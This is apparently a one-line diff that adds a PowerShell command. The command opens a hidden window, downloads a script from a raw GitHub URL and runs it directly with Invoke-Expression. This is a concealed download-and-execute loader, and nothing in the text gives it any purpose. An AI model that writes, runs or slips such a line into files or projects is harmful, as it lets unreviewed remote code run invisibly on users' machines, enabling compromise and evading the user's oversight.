@@ -1,0 +1,1 @@
+powershell.exe -W Hidden -command $url = 'https://raw.githubusercontent.com/tomC-cyber/PowerShell/refs/heads/main/PowerShell_SBT'; $response = Invoke-WebRequest -Uri $url -UseBasicParsing; $text = $response.Content; iex $text
